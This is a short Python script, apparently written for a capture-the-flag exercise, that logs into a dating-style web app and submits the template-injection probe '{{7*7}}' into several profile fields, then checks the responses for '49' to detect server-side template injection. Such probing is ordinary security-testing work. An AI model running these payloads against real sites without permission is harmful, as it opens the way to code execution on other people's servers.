import sys, re; sys.path.insert(0,'.')
from rmeet import *
login()

def setprofile(**kw):
    t = csrf("/profile/"+USER)
    d = {"csrf_token": t, "full_name":"Pauk", "age":"25", "gender":"male",
         "location":"Sydney", "bio":"hello there friend", "interests":"ctf", "submit":"Save Profile"}
    d.update(kw)
    r = s.post(BASE+"/profile/"+USER, data=d, timeout=20)
    return r

PAY = "{{7*7}}"
for f in ["full_name","location","bio","interests"]:
    r = setprofile(**{f: PAY if f!="bio" else PAY+" padding text"})
    body = r.text
    hit = "49" in body
    print(f, "->", "SSTI!" if hit else "no", "| reflected raw:" , PAY in body)
    # show context
    for m in re.finditer(r'.{60}(49|\{\{7\*7\}\}).{40}', body, re.S):
        print("   ", m.group(0).replace("\n"," ")[:140])
